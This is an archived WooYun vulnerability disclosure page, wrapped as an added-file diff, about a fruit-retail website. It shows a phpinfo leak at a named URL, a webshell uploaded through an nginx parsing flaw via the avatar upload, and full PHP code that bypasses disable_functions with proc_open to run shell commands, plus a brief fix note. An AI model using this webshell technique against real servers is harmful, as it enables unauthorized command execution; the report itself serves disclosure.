@@ -1,0 +1,219 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		某买果网站nginx解析+突破disable_function执行命令  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		某买果网站nginx解析+突破disable_function执行命令  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猫大叔">猫大叔</a> 
+</li><li>提交时间：		2012-12-14 11:12</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-14：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-01-28：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">运气好遇上了nginx解析漏洞，传了shell之后发现不能执行命令。仔细一看，有转机。。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">phpinfo信息泄露</p><pre><code>http://axi.com.cn/phpinfo.php</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/140057524b29fdbca99fb520ddbfc5d87a0b4713.png" target="_blank"><img src="../images/140057524b29fdbca99fb520ddbfc5d87a0b4713.png" alt="2012-12-14 上午12.56.21.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+nginx 解析漏洞。<br />
+<br />
+注册个用户，上传头像，成功拿到shell<br />
+<br />
+</p><p class="detail"><a href="../images/14005854978067a1180f94ac495386915bec2a84.png" target="_blank"><img src="../images/14005854978067a1180f94ac495386915bec2a84.png" alt="2012-12-14 上午12.58.26.png" width="600"/></a></p><p class="detail"><br />
+<br />
+执行命令失败，看看disable_function有哪些函数。<br />
+<br />
+</p><p class="detail"><a href="../images/14010115fb34c4df29d19f9b860353c76bb61508.png" target="_blank"><img src="../images/14010115fb34c4df29d19f9b860353c76bb61508.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+发现未禁用 proc_open 函数,使用此函数来突破，代码如下：<br />
+<br />
+</p><pre><code>&lt;?php<br />
+$command=&quot;id\npwd\n&quot;;<br />
+$descriptorspec = array(<br />
+	0 =&gt; array(&#039;pipe&#039;, &#039;r&#039;),<br />
+	1 =&gt; array(&#039;pipe&#039;, &#039;w&#039;),<br />
+	2 =&gt; array(&#039;pipe&#039;, &#039;w&#039;)<br />
+);<br />
+ <br />
+$resource = proc_open($command, $descriptorspec, $pipes, null, $_ENV);<br />
+if (is_resource($resource))<br />
+{<br />
+	fwrite($pipes[0], &quot;pwd\n&quot;);<br />
+	$stdin = $pipes[0];<br />
+	$stdout = $pipes[1];<br />
+	$stderr = $pipes[2];<br />
+ <br />
+	while (! feof($stdout))<br />
+	{<br />
+		$retval .= fgets($stdout,1024);<br />
+	}<br />
+ <br />
+	while (! feof($stderr))<br />
+	{<br />
+		$error .= fgets($stderr);<br />
+	}<br />
+	fwrite($pipes[0], &quot;pwd\n&quot;);<br />
+	$stdout = $pipes[1];<br />
+	$stderr = $pipes[2];<br />
+ <br />
+	while (! feof($stdout))<br />
+	{<br />
+		$retval .= fgets($stdout,1024);<br />
+	}<br />
+ <br />
+	while (! feof($stderr))<br />
+	{<br />
+		$error .= fgets($stderr);<br />
+	}<br />
+ <br />
+	fclose($stdin);<br />
+	fclose($stdout);<br />
+	fclose($stderr);<br />
+ <br />
+	$exit_code = proc_close($resource);<br />
+}<br />
+if (! empty($error))<br />
+	throw new Exception($error);<br />
+else<br />
+	echo $retval;<br />
+ <br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/14010127230d36d466f43eaae3dedae4c5f63b34.png" target="_blank"><img src="../images/14010127230d36d466f43eaae3dedae4c5f63b34.png" alt="2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">首要是配置好nginx，其次上传图片可以考虑二次渲染。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猫大叔" title="猫大叔">猫大叔</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015991" title="某买果网站nginx解析+突破disable_function执行命令">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15991";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
